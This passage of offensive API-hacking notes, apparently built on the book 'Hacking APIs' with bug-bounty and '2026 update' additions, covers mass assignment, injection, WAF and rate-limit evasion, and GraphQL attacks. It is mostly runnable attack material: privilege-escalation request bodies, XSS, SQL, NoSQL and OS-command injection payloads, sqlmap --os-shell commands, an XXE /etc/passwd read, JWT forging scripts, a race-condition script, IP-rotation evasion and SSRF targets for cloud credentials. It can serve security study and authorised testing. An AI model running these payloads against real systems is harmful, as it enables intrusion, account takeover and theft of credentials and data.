- Mass assignment happens when the API blindly binds **all** fields in client input to internal objects/database columns instead of only the fields it meant to expose — the vulnerability is in what the server *accepts*, not what the documentation *describes*.
- Always test **account registration** first — it's the single most common place to try privilege-escalation fields like `"admin": true` because a brand-new account has nothing to lose if the attempt fails.
- The technique scales with information you've already gathered: variables seen in *admin* API docs, or in *any* request body (even unrelated ones), are fair game to try on *every other* writable endpoint.
- When unsure of field names, **blind mass assignment** (stuffing a long list of likely privilege-field names into one request) is a legitimate, fast first pass before resorting to targeted fuzzing.
- Mass assignment becomes far more dangerous when **chained with BFLA** — a BFLA that lets you edit another user's profile is only mildly interesting until you combine it with a mass-assignment field (like disabling their MFA or changing their email) to fully take over the account.
- This vulnerability frequently hides in plain sight in ecommerce/pricing logic — test negative numbers, decimals, and type confusion on any field related to price/credit/balance.

### Finding targets
- Account registration (`POST /api/v1/register`) — try adding `"admin": true`
- Org/group assignment — try `"org": "§CompanyA§"` and fuzz value
- Profile/account update endpoints
- Password reset endpoints

### Finding variable names
1. **Documentation diff**: compare low-priv vs admin account-creation docs for extra fields (e.g. `"admin": true`).
2. **Fuzz unknown variables**: capture a request with bonus fields (`uam`, `mfa`, `account`), fuzz their values.
3. **Blind mass assignment**: stuff many guessed variable names into one request body:
```json
{
  "username":"hAPI_hacker",
  "email":"hapi@hacker.com",
  "admin": true,
  "admin":1,
  "isadmin": true,
  "role":"admin",
  "role":"administrator",
  "user_priv": "admin",
  "password":"Password1!"
}
```

### Automating with Arjun
```bash
arjun --headers "Content-Type: application/json" -u http://vulnhost.com/api/register -m JSON --include='{$arjun$}'
```

### Automating with Burp Intruder
Set payload position directly around candidate mass-assignment value:
```json
{"username":"hAPI_hacker","email":"hapi@hacker.com",§"admin": true§,"password":"Password1!"}
```

### Combining BFLA + Mass Assignment
If a BFLA lets you edit another user's profile fields, also inject sensitive fields discovered elsewhere (e.g. `"email"`, `"mfa": false`) to hijack the account via password-reset flow.

### Lab 8 — crAPI store price manipulation
```http
POST /workshop/api/shop/products HTTP/1.1
Authorization: Bearer <token>

{"name":"MassAssignment SPECIAL","price":-5000,"image_url":"https://example.com/x.jpg"}
```
Negative price + purchase = credited balance (store pays attacker).

### 🎯 Bug Bounty Add-ons for Mass Assignment

```bash
# Param Miner's "Guess headers"/"Guess params" passive scan (BApp Store) — auto-discovers hidden
# writable fields like isAdmin, role, verified, premium, balance across every proxied request.

# Arjun against JSON bodies specifically (most modern APIs are JSON, not form-urlencoded)
arjun -u https://target.com/api/v1/profile/update -m JSON --headers "Authorization: Bearer $TOKEN"

# x8 for mass-assignment-flavored param brute force with request diffing built in
x8 -u https://target.com/api/v1/user/update -X PUT --body-type json \
   -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# Quick manual "privilege field" wordlist worth keeping on hand for every program
cat > priv_fields.txt << 'EOF'
admin
isAdmin
is_admin
role
roles
user_role
account_type
accountType
permission
permissions
privilege
isPremium
is_premium
verified
is_verified
active
enabled
approved
status
balance
credit
credits
discount
price
EOF
```

---

## Chapter 12: Injection

### 📌 Must-Know Key Points
- Injection class is named after the **backend technology it targets**, not the API itself — figure out what's running behind the API (SQL vs NoSQL vs OS vs browser-rendered) before choosing your payload set; blind generic fuzzing wastes time.
- "Request the unexpected" is the universal injection-discovery technique: send a string where a number is expected, a huge value where a small one is expected, symbols where clean text is expected — then watch for verbose errors.
- These are some of the **oldest, best-known web vulnerability classes** (XSS, SQLi have existed for 20+ years) — expect defenders to have decent protections already in place; success often requires evasion techniques (Ch.13) layered on top.
- **NoSQL injection is comparatively under-tested** by defenders and increasingly common in APIs (since APIs scale well with NoSQL architecture) — don't skip it just because it's less famous than SQLi.
- Always check whether Burp Intruder/Wfuzz is **URL-encoding your payloads automatically** — encoded injection payloads often get rejected or silently fail to trigger the vulnerability; disable auto-encoding when testing raw metacharacters.
- A single successful injection finding should be **retested across every structurally similar endpoint** — if `/file/upload` is vulnerable, check `/image/upload`, `/account/upload`, etc. immediately.
- The real-world impact scale of injection is enormous — from a simple verbose SQL error, all the way up to full OS shell access; always try to demonstrate maximum realistic impact (e.g., SQLmap `--os-shell`) when reporting.

### Discovery approach
Test every input point: API keys, tokens, headers, query strings, POST/PUT params. Request the unexpected (wrong type/size), watch for verbose errors / unusual timing.

### Cross-Site Scripting (XSS) payloads
```
<script>alert("xss")</script>
<script>alert(1);</script>
<%00script>alert(1)</%00script>
SCRIPT>alert("XSS");///SCRIPT>
```
Lists: Payload Box XSS list, Wfuzz wordlist, netsec.expert XSS payloads.

### Cross-API Scripting (XAS)
Inject via one API's input that is later rendered into a *different* app's frontend (poor sanitization across integrated systems). Also try header manipulation:
```
Content-Type: text/html
```

### SQL Injection — manual metacharacters
```
'
''
;%00
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1
```
Example classic bypass:
```sql
SELECT * FROM userdb WHERE username = 'hAPI_hacker' OR 1=1-- -
```

### SQLmap
```bash
sqlmap -r /home/hapihacker/burprequest1 -p password
sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --dump-all
sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --dump -T users -C password -D helpdesk
sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --os-shell
sqlmap -r /home/hapihacker/burprequest1 -p vuln-param --os-pwn
```
`-r` saved Burp request file, `-p` target parameter.

### NoSQL Injection — metacharacters
```
$gt            {"$gt":""}      {"$gt":-1}
$ne            {"$ne":""}      {"$ne":-1}
$nin           {"$nin":1}      {"$nin":[1]}
|| '1'=='1
//
||'a'\\'a
'||'1'=='1';//
'/{}:
'"\;{}
'"\/$[].>
{"$where": "sleep(1000)"}
```
Test by placing payload as password/field value; look for auth bypass (202/200 instead of failed login).

### Operating System Command Injection
Command separators:
```
| || & && ' " ; '"
```
OS commands to try once separator confirmed:
| OS | Commands |
|---|---|
| Windows | `ipconfig`, `dir`, `ver`, `echo %CD%`, `whoami` |
| *nix | `ifconfig`, `ls`, `uname -a`, `pwd`, `whoami` |

Wfuzz dual-payload attack:
```bash
wfuzz -z file,wordlists/commandsep.txt -z file,wordlists/os-cmds.txt \
  http://vulnerableAPI.com/api/users/query?=WFUZZWFUZ2Z
```
Burp equivalent: **cluster bomb** with two payload sets (separators × commands).

### Lab 9 — crAPI coupon NoSQL injection
```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Authorization: Bearer <token>

{"coupon_code":"{"$nin":[1]}"}
```
Note: disable Burp Intruder's automatic URL-encoding of payloads (Payloads tab → uncheck "URL-encode these characters") and keep payload position **inside** the outer quotes to allow nested-object injection. Successful payloads: `{"$gt":""}` and `{"$nin":[1]}` → returns valid forged coupon.

### 🎯 Bug Bounty Add-ons for Injection

```bash
# Ghauri — modern, faster alternative to SQLmap for blind/time-based SQLi on API endpoints
pip install ghauri --break-system-packages
ghauri -u "https://target.com/api/v1/search?q=test" --batch --dbs

# NoSQLmap — automated NoSQL injection + MongoDB misconfig scanning
git clone https://github.com/codingo/NoSQLMap
python3 nosqlmap.py   # interactive menu, point at target API login/search endpoint

# commix — automated OS command injection exploitation (great companion to manual testing in Ch.12)
pip install commix --break-system-packages
commix --url="https://target.com/api/v1/ping" --data='{"host":"8.8.8.8"}' --headers="Content-Type: application/json"

# dalfox — dedicated XSS scanner w/ built-in payload mutation, good for XAS-style API->frontend chains
dalfox url "https://target.com/api/v1/profile?name=FUZZ" --mining-dom --mining-dict

# tplmap — Server-Side Template Injection (SSTI) scanner; common in API endpoints that render
# templated emails/PDFs/notifications from user-supplied fields
git clone https://github.com/epinna/tplmap
python3 tplmap.py -u 'https://target.com/api/v1/notify?name=test'

# Collaborator/interactsh for OOB (out-of-band) confirmation of blind injection/SSRF/XXE
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client          # generates a unique *.oast.fun / collaborator URL to use as payload callback
# payload example: {"url":"http://<id>.oast.fun/ssrf-test"}  -- confirm via interactsh-client log

# XXE quick test payload for XML-accepting API endpoints (Content-Type: application/xml)
cat > xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
EOF
curl -X POST https://target.com/api/v1/import -H "Content-Type: application/xml" --data @xxe.xml
```

---

## Chapter 13: Evasive Techniques & Rate Limit Testing

### 📌 Must-Know Key Points
- **Attribution is the single thing every security control depends on** — since REST is stateless, a WAF/rate-limiter can only block you based on something *in the request itself* (IP, token, header, pattern). Find what they're using for attribution, and you usually find your bypass.
- Always use the API as a normal, valid user **first** to detect WAF presence via response headers (`X-CDN`, `Server`, etc.) before throwing attacks — going in loud risks getting banned before you've learned anything.
- Set up **burner accounts with unique, unlinkable PII** before any noisy testing (brute force, large fuzzing sweeps) — assume you *will* get at least one account banned.
- Evasion is layered and iterative: string terminators → case switching → encoding (single or double) — if one technique fails, combine it with another rather than giving up.
- A rate limit that's merely **inconvenient** (not strictly enforced) can often just be out-waited by throttling your own tool's request speed (`-s`/`-t` in Wfuzz, Resource Pool in Intruder) — you don't always need a bypass.
- Rate limiting and WAF bypass is not "cheating" — it's a required skill because real attackers (and real bug hunters) routinely defeat these controls; an API that *looks* protected but isn't is itself the vulnerability worth reporting.

### Detecting WAF/security controls
Headers that hint at CDN/WAF:
```
X-CDN: Imperva
X-CDN: Served-By-Zenedge
X-CDN: fastly
X-CDN: akamai
X-CDN: Incapsula
X-Kong-Proxy-Latency: 123
Server: Zenedge
Server: Kestrel
X-Zen-Fury
X-Original-URI
```
```bash
nmap -p 80 --script http-waf-detect http://hapihacker.com
```
Tools: W3af, Wafw00f, Bypass WAF (Burp extension).

### Burner accounts
Create multiple disposable test accounts (unique PII per account) before launching noisy attacks.

### Evasion techniques
**String terminators**:
```
%00  0x00  //  ;  %  !  ?  []  %5B%5D  %09  %0a  %0b  %0c  %0e
```
**Case switching**:
```
<sCriPt>alert('supervuln')</scrIpT>
SeLeCT * RoM all_tables
```
**Encoding payloads** (Burp **Decoder**): URL-encode, double-encode, HTML, base64 — focus on `< > ( ) [ ] { } ; ' / \ |`.

### Automating evasion — Burp Intruder payload processing
`Payloads → Payload Processing → Add`:
1. **Encode** → URL-Encode All Characters
2. **Add Prefix** → `%00`
3. **Add Suffix** → `%00`
(Rules apply top-to-bottom.)

### Automating evasion — Wfuzz encoders
```bash
wfuzz -e encoders                                           # list encoders
wfuzz -z file,wordlist/api/common.txt,base64 http://hapihacker.com/FUZZ
wfuzz -z list,a-b-c,base64-md5-none -u http://hapihacker.com/api/v2/FUZZ
wfuzz -z list,aaaaa-bbbbb-ccccc,base64@random_upper -u http://192.168.195.130:8888/identity/api/auth/v2/FUZZ
```
`-` = separate requests per encoder; `@` = chain multiple encoders on same payload.

### Testing Rate Limits
Indicator headers:
```
x-rate-limit:
x-rate-limit-remaining:
Retry-After:
```
Response code to watch: `429 Too Many Requests`.

**Throttle Wfuzz to stay under a limit**:
```bash
wfuzz -t <threads> -s <seconds-delay> ...
```
| Delay (s) | ~Rate |
|---|---|
| 0.01 | 10/sec |
| 1 | 1/sec |
| 6 | 10/min |
| 60 | 1/min |

**Throttle Burp Intruder (Pro)**: `Resource Pool` → delay in ms.
| Delay (ms) | ~Rate |
|---|---|
| 100 | 10/sec |
| 1000 | 1/sec |
| 6000 | 10/min |
| 60000 | 1/min |

### Path bypass (rate-limit evasion)
```
POST /api/myprofile%00
POST /api/myprofile%20
POST /api/myProfile
POST /api/MyProfile
POST /api/my-profile
POST /api/myprofile?test=1
```

### Origin header spoofing
```
X-Forwarded-For
X-Forwarded-Host
X-Host
X-Originating-IP
X-Remote-IP
X-Client-IP
X-Remote-Addr
```
Also rotate `User-Agent` (SecLists User-Agents wordlist) to evade fingerprint-based limiting.

### Rotating IP addresses — Burp IP Rotate extension
```bash
pip3 install boto3
# download Jython standalone jar from https://www.jython.org/download.html
```
1. Burp → Extender → Options → set Python Environment to Jython standalone jar.
2. Extender → BApp Store → install **IP Rotate**.
3. AWS Console → IAM → Add User (programmatic access) → attach policies:
   - `AmazonAPIGatewayAdministrator`
   - `AmazonAPIGatewayInvokeFullAccess`
4. Download CSV (Access Key + Secret Key).
5. Burp → IP Rotate tab → paste keys → Save Keys.
6. Set **Target host**, choose protocol, click **Enable**.
7. Test against `https://ipchicken.com` to confirm rotating source IP.

### 🎯 Bug Bounty Add-ons for Evasion & Rate Limits

```bash
# wafw00f — quick WAF fingerprinting before you waste requests on a target that will just ban you
pip install wafw00f --break-system-packages
wafw00f https://target.com

# bypass-403 / dontgo403 — automated collection of 401/403 bypass techniques (headers, path tricks, verbs)
go install github.com/devploit/dontgo403@latest
dontgo403 -u https://target.com/api/admin/users

# Common manual 403 bypass headers worth scripting into any request:
for h in "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Custom-IP-Authorization: 127.0.0.1" \
         "X-Forwarded-For: 127.0.0.1" "X-Forwarded-Host: 127.0.0.1" "Referer: https://target.com/admin"; do
  curl -s -o /dev/null -w "%{http_code}  [$h]\n" -H "$h" https://target.com/api/admin/users
done

# Rate-limit-bypass-by-method-override trick
curl -s -X POST https://target.com/api/v1/login -H "X-HTTP-Method-Override: GET" -d '{}'

# Multi-IP distributed fuzzing via proxy rotation list (CLI alternative to Burp IP Rotate)
proxychains4 ffuf -u https://target.com/api/FUZZ -w wordlist.txt   # using rotating proxies in proxychains.conf

# Turbo Intruder race-condition template for bounty-classic "redeem coupon twice" / "free item" bugs
# (see full script in the 2026 Update section — §O)
```

---

## Chapter 14: Attacking GraphQL

### 📌 Must-Know Key Points
- GraphQL is **not REST with a different name** — it's a query language, much closer to SQL in behavior. The entire API lives behind **one single endpoint**, almost always via `POST`, so none of the REST-style endpoint enumeration techniques directly apply.
- GraphQL frequently returns **HTTP 200 even on failure** — the real error/success signal is *inside the JSON response body*, not the status code. Build your baselines around response content, not just status codes.
- If **introspection is enabled**, you get the entire schema for free (types, fields, mutations) — always try an introspection query first; it's the single highest-value GraphQL recon step and equivalent to finding a full API spec.
- If introspection is disabled, it is **not game over** — schema recovery via field-suggestion/"did you mean" errors (or tools like `clairvoyance`) can often reconstruct the schema anyway.
- Every technique from Ch.6–13 still applies conceptually to GraphQL — you just redirect it at **query/mutation arguments** instead of REST parameters (e.g., BOLA via an object ID argument, injection via a `path`/`host` argument in a mutation).
- GraphQL has **unique DoS vectors that REST doesn't**: batched queries in a single request, deeply nested queries, and field aliasing can all bypass naive REST-style rate limiting — always test these separately.
- GraphiQL/Playground IDEs, when exposed (sometimes behind a disable-able cookie flag, as in DVGA), massively speed up manual testing — always check for and try to enable them before resorting to raw `curl`/Postman requests.

### Key differences from REST
- Single endpoint, always `POST` (sometimes `GET` for queries too).
- Operations: `query` (read), `mutation` (create/update/delete), `subscription` (real-time).
- Usually returns HTTP 200 even on logical errors (error detail is inside the JSON body).
- Often ships with an IDE: GraphiQL, GraphQL Playground, Altair Client.

### Recon
```bash
nmap -sC -sV 192.168.195.132
nikto -h 192.168.195.132:5000
```
Look for header hint `http-title: ... GraphQL ...` and `Set-Cookie: env=graphiql:disable`.

### Finding the GraphQL endpoint (Kiterunner + SecLists)
```bash
kr brute http://192.168.195.132:5000 -w /usr/share/seclists/Discovery/Web-Content/graphql.txt
```
Common candidate paths:
```
/graphql  /v1/graphql  /api/graphql  /v1/api/graphql
/graph    /v1/graph    /graphiql     /v1/graphiql
/console  /query       /graphql/console
/altair   /playground
```

### Enabling GraphiQL via cookie tampering
1. Intercept `GET /graphiql`, note `env` cookie (base64).
2. Burp Decoder: decode `env` → `graphiql:disable`.
3. Re-encode as `graphiql:enable` (base64).
4. In browser DevTools → **Application/Storage → Cookies** → edit `env` cookie value to the new base64 string → reload `/graphiql`.

### Reverse engineering requests
- Proxy browser traffic → Postman capture (port 5555) while clicking through every app feature.
- Rename captured `/graphql` POST requests based on body content (all share same endpoint/method).

### Introspection query (schema disclosure)
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
```
If this succeeds, you get the **full schema** — equivalent of finding a REST spec file.

### Crafting queries in GraphiQL Documentation Explorer
```graphql
query {
  pastes (public: true) {
    title
    content
    public
    ipAddr
    pId
  }
}
```

### InQL Burp Extension (GraphQL-aware Burp integration)
1. Install via BApp Store (requires Jython, same setup as IP Rotate).
2. **InQL Scanner** tab → enter target GraphQL URL → auto-generates saved query/mutation templates.
3. Right-click a generated request (e.g. `paste.query`) → **Send to Repeater** → edit `code`/ID value → test for BOLA.
4. Send to **Intruder** → brute-force the ID field (e.g. `pId` 0–166) → look for `"public": false` records leaking in response (BOLA).

### Fuzzing GraphQL mutations for command injection
Target `variables` block of a mutation (e.g. `ImportPaste`):
```json
{"query":"mutation ImportPaste($host: String!, $port: Int!, $path: String!, $scheme: String!) {...}",
 "variables": {"host":"google.com","port":80,"path":"/","scheme":"http"}}
```
Set Intruder payload position on a field like `path`. Payload set 1 (separators):
```
|  ||  &  &&  '  "  ;  '"
```
Payload set 2 (commands/injection):
```
whoami
{"$where": "sleep(1000) "}
;%00
-- -
```
Disable payload URL-encoding. Confirmed RCE example:
```json
"path": "/ ; cat /etc/passwd"
```
Response leaking `/etc/passwd` confirms OS command injection via GraphQL mutation argument (root-level access in example).

### 🎯 Bug Bounty Add-ons for GraphQL

```bash
# graphw00f — fingerprint the GraphQL engine in use (Apollo, Hasura, Graphene, etc.) to pick the
# right known-CVE/misconfig playbook fast (huge time-saver on GraphQL-heavy bounty programs)
git clone https://github.com/dolevf/graphw00f
python3 graphw00f/main.py -d -t https://target.com/graphql

# GraphQL Voyager — visualize a recovered/introspected schema to spot admin-only types/fields at a glance
# (https://github.com/graphql-kit/graphql-voyager — paste schema JSON into the hosted/local instance)

# InQL CLI mode (not just Burp extension) — generate Postman/doc collections from any GraphQL endpoint
pip install inql --break-system-packages
inql -t https://target.com/graphql -o inql_output/

# Batch query cost / complexity abuse probe — look for missing query-cost limiting (DoS, API4:2023/API6:2023)
curl -s https://target.com/graphql -X POST -H "Content-Type: application/json" \
  -d '{"query":"query{ a:__typename b:__typename c:__typename d:__typename e:__typename }"}'
# if aliasing 1000x __typename (or a real expensive field) doesn't get rejected/rate-limited -> report it

# Field suggestion / "did you mean" leakage — GraphQL servers often reveal valid field names even with
# introspection disabled, by suggesting the closest match to a deliberately misspelled field:
curl -s https://target.com/graphql -X POST -H "Content-Type: application/json" \
  -d '{"query":"query{ usrr{ id } }"}'
# response "Did you mean \"user\"?" -> confirms a "user" type exists even without introspection

# CSRF on GraphQL — many GraphQL servers accept GET requests with query params, making CSRF possible
# if no CSRF token / SameSite cookie protection is enforced:
curl -s "https://target.com/graphql?query=mutation{deleteAccount}" -b "session=<victim_cookie>"
```

---

## 2026 Update — Modern Tooling, Scripts & Techniques Not in the Original Book

> The book (2022) is still structurally correct, but tooling has moved on. This section adds the
> current-generation equivalents, automation scripts, and attack classes that a real 2025–2026
> API engagement expects you to know, mapped back onto the same chapter flow.

### A. Modern recon stack (faster/maintained replacements & additions)

```bash
# ProjectDiscovery suite — install via go
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install -v github.com/ffuf/ffuf/v2@latest
go install -v github.com/tomnomnom/gau@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/tomnomnom/waybackurls@latest

# Subdomain enum -> live hosts -> crawl -> template scan (modern recon chain)
subfinder -d target.com -silent | httpx -silent -title -status-code -tech-detect -o live_hosts.txt
cat live_hosts.txt | katana -d 3 -jc -silent -o crawled_urls.txt
cat crawled_urls.txt | grep -Ei '/(api|v[0-9]|graphql|rest|rpc)/' > api_candidates.txt

# Historical URL discovery for forgotten/old API versions (improper assets mgmt)
gau target.com | grep -Ei '/api/|/v[0-9]+/' | sort -u
waybackurls target.com | grep -Ei '/api/' | sort -u
```

### B. ffuf — modern replacement/complement to Wfuzz (faster, Go-based)

```bash
# Install
go install github.com/ffuf/ffuf/v2@latest

# Directory / endpoint discovery
ffuf -u https://target.com/api/FUZZ -w ~/api/wordlists/common_apis_160 -mc 200,201,204,301,302,401,403

# Versioned-path / improper assets management sweep
ffuf -u https://target.com/api/FUZZ/users -w versions.txt:FUZZ -mc all -fc 404

# Parameter fuzzing (body) with auth header, filtering by response size
ffuf -u https://target.com/api/v1/register -X POST \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"username":"x","FUZZ":"true"}' \
  -w mass_assignment_params.txt \
  -fs 128   # filter out baseline-size responses, show anomalies

# Rate-limited, recursive scan with match/filter combos
ffuf -u https://target.com/FUZZ -w raft-medium-directories.txt -recursion -recursion-depth 2 \
  -t 40 -rate 50 -mc 200,301,302,401,403 -of json -o ffuf_results.json
```

### C. nuclei — template-driven API vulnerability scanning

```bash
nuclei -update-templates

# Run full exposures + misconfig + CVE templates against an API host
nuclei -u https://target.com -tags api,exposure,misconfig,token,jwt,cve -severity medium,high,critical

# Target a list of discovered API endpoints
nuclei -list api_candidates.txt -tags api -o nuclei_api_findings.txt

# Custom template example — check for exposed GraphQL introspection
cat > graphql-introspection.yaml << 'EOF'
id: graphql-introspection-enabled
info:
  name: GraphQL Introspection Enabled
  severity: medium
requests:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
    headers:
      Content-Type: application/json
    body: '{"query":"query{__schema{types{name}}}"}'
    matchers:
      - type: word
        words:
          - "__schema"
EOF
nuclei -t graphql-introspection.yaml -u https://target.com
```

### D. Schemathesis — property-based fuzzing straight from an OpenAPI/Swagger spec
(The single highest-value 2026 addition: turns documentation into an automated attack.)

```bash
pip install schemathesis --break-system-packages

# Fuzz every endpoint defined in a discovered OpenAPI spec
schemathesis run https://target.com/api/openapi.json \
  --checks all \
  --header "Authorization: Bearer $TOKEN" \
  --hypothesis-max-examples=200 \
  --report

# Negative testing only (malformed/boundary input against schema)
schemathesis run https://target.com/api/openapi.json --checks negative_data_rejection

# Stateful testing (chains Create->Read->Update->Delete automatically using links in spec)
schemathesis run https://target.com/api/openapi.json --stateful=links
```

### E. Postman/Newman for CI-grade, repeatable API attack automation

```bash
npm install -g newman newman-reporter-htmlextra

# Run a saved Postman collection headlessly (e.g., your BOLA/BFLA test collection)
newman run crapi-auth-tests.postman_collection.json \
  -e crapi-environment.json \
  --reporters cli,htmlextra \
  --reporter-htmlextra-export report.html

# Data-driven run — iterate a collection once per row in a CSV of tokens/IDs (great for BOLA sweeps)
newman run bola-sweep.postman_collection.json -d user_ids.csv -n 1
```

### F. GraphQL-specific modern tooling (beyond InQL)

```bash
# graphql-cop — automated GraphQL security checks (introspection, batching, DoS, CSRF, etc.)
pip install graphql-cop --break-system-packages
graphql-cop -t https://target.com/graphql

# clairvoyance — recover a GraphQL schema even when introspection is DISABLED
pip install clairvoyance --break-system-packages
clairvoyance -o recovered_schema.json https://target.com/graphql

# GraphQLmap — interactive GraphQL exploitation shell (injection, bypass, dumping)
git clone https://github.com/swisskyrepo/GraphQLmap
python3 graphqlmap.py -u https://target.com/graphql

# Batch-query DoS test (GraphQL allows stacking many queries in one request — bypasses naive rate limiting)
curl -s https://target.com/graphql -X POST -H "Content-Type: application/json" \
  -d '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'

# Query depth / aliasing DoS probe (resource exhaustion via nested or aliased queries)
python3 - << 'EOF'
depth_query = "query{" + "user{friends{" * 50 + "name" + "}" * 50 + "}}"
print(depth_query)
EOF
```

### G. JWT — modern follow-ups to jwt_tool

```bash
# jwt_tool latest usage (flags evolved — always check current help)
python3 jwt_tool.py -h

# Fuzz claims automatically against common bypass payloads
python3 jwt_tool.py <token> -T

# Scan a token against jwt_tool's built-in vulnerability playbook (expanded in 2024+ versions)
python3 jwt_tool.py <token> -M at   # "all tests" scan mode in newer releases

# jwt_hack (Go) — quick alg confusion + brute force alternative
go install github.com/hahwul/jwt-hack@latest
jwt-hack decode <token>
jwt-hack sign -A HS256 -k 'secret' '{"user":"admin"}'
jwt-hack crack -w rockyou.txt <token>

# kid (Key ID) header injection — SQLi / path traversal / SSRF via the "kid" claim
# Decode header, then try:
#   "kid": "../../../../dev/null"      -> forces empty string as HMAC key -> forge with empty secret
#   "kid": "' UNION SELECT 'attackerkey'-- -"   -> if kid is used in a DB lookup
```

### H. Custom Python attack scripts (quick-write, reusable)

**BOLA ID sweeper (async, fast):**
```python
import asyncio, httpx

BASE = "https://target.com/api/v1/user"
TOKEN = "Bearer <low-priv-token>"
IDS = range(1, 2000)

async def check(client, i):
    r = await client.get(f"{BASE}/{i}", headers={"Authorization": TOKEN})
    if r.status_code == 200:
        print(f"[+] Accessible ID {i} -> {r.text[:120]}")

async def main():
    async with httpx.AsyncClient(timeout=10) as client:
        await asyncio.gather(*(check(client, i) for i in IDS))

asyncio.run(main())
```

**JWT "none" / alg-confusion forge (no jwt_tool dependency):**
```python
import base64, json, hmac, hashlib

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}

token = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}."
print("none-alg token:", token)

# HS256 forge with a known/cracked secret
secret = b"crapi"
h2 = {"alg": "HS256", "typ": "JWT"}
seg = f"{b64url(json.dumps(h2).encode())}.{b64url(json.dumps(payload).encode())}"
sig = hmac.new(secret, seg.encode(), hashlib.sha256).digest()
print("forged HS256 token:", f"{seg}.{b64url(sig)}")
```

**Mass assignment blind-field brute forcer:**
```python
import httpx

url = "https://target.com/api/v1/register"
candidates = ["admin","isAdmin","is_admin","role","roles","privilege","user_priv","superuser","verified","active"]

base_body = {"username": "fuzztest", "email": "fuzz@test.com", "password": "Password1!"}

for field in candidates:
    body = dict(base_body)
    body[field] = True
    r = httpx.post(url, json=body, timeout=10)
    print(f"{field:15} -> {r.status_code} ({len(r.text)} bytes)")
```

### I. mitmproxy — scriptable alternative/complement to Burp (great for CI and headless testing)

```bash
pip install mitmproxy --break-system-packages
mitmproxy -p 8081            # interactive TUI
mitmdump -p 8081 -s rewrite_token.py   # headless, run a transform script on every flow
```
```python
# rewrite_token.py — auto-swap Authorization header on every request (automates A-B BOLA testing)
def request(flow):
    if "api" in flow.request.pretty_url:
        flow.request.headers["Authorization"] = "Bearer USER_B_TOKEN"
```

### J. Emerging proxy alternative — Caido
```bash
# Caido (Rust-based Burp alternative, growing in 2024-2026 for API-heavy testing with better
# native HTTP/2 + match/replace scripting). Install via official releases (caido.io).
# Workflow mirrors Burp: Intercept -> Replay -> Automate (bulk match/replace + scripting in JS).
```

### K. Modern SecLists paths worth knowing (wordlist locations shift over time — always verify)
```bash
ls /usr/share/seclists/Discovery/Web-Content/api/
ls /usr/share/seclists/Discovery/Web-Content/swagger/
ls /usr/share/seclists/Fuzzing/
ls /usr/share/seclists/Usernames/
ls /usr/share/seclists/Passwords/Common-Credentials/
```

### L. HTTP/2 & HTTP/3 considerations
APIs increasingly run over HTTP/2 (gRPC, modern gateways) and HTTP/3 (QUIC). Standard tooling can miss
request-smuggling-class bugs that only appear at protocol-translation boundaries (HTTP/2 -> HTTP/1.1
downgrade at the gateway/CDN).
```bash
# Confirm protocol in use
curl -I --http2 https://target.com/api/v1/health
nghttp -nv https://target.com/api/v1/health

# h2csmuggler for HTTP/2 downgrade smuggling checks
git clone https://github.com/BishopFox/h2csmuggler
python3 h2csmuggler.py -x target.com:443 -u https://target.com/admin
```

### M. gRPC / Protobuf API testing (common in microservice backends)
```bash
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services on a gRPC endpoint (reflection-enabled = info disclosure risk)
grpcurl -plaintext target.com:50051 list

# Describe a service/method
grpcurl -plaintext target.com:50051 describe myservice.UserService

# Call a method with JSON payload (equivalent of a REST POST)
grpcurl -plaintext -d '{"user_id": 1}' target.com:50051 myservice.UserService/GetUser

# BOLA-style ID sweep against gRPC
for i in $(seq 1 100); do
  grpcurl -plaintext -d "{\"user_id\": $i}" target.com:50051 myservice.UserService/GetUser
done
```

### N. WebSocket API testing
```bash
# wscat for manual WebSocket interaction
npm install -g wscat
wscat -c wss://target.com/ws -H "Authorization: Bearer $TOKEN"

# Burp Suite natively intercepts WebSocket traffic in the WebSockets history tab (Proxy -> WS history)
# Test for: missing origin validation, missing auth on upgrade request, message-level BOLA/injection
```

### O. Race condition / Turbo Intruder (single-packet attack — defeats naive rate limiting)
```python
# Burp "Turbo Intruder" extension script — send many requests near-simultaneously to win races
# (classic use: coupon redemption, balance transfer, account creation uniqueness checks)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=20,
                            engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```
Install via BApp Store: **Turbo Intruder**. Use for coupon/mass-assignment/BFLA attacks where a
rate limit or uniqueness check can be beaten by firing requests in the same TCP window.

### P. Cloud-native API attack surface (2024-2026 standard checks)
```bash
# SSRF pivot to cloud metadata endpoints — check if any API field (image_url, webhook, import-from-url)
# can be pointed at internal metadata services:
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01   (needs Metadata:true header)
GCP:   http://169.254.169.254/computeMetadata/v1/                        (needs Metadata-Flavor:Google header)

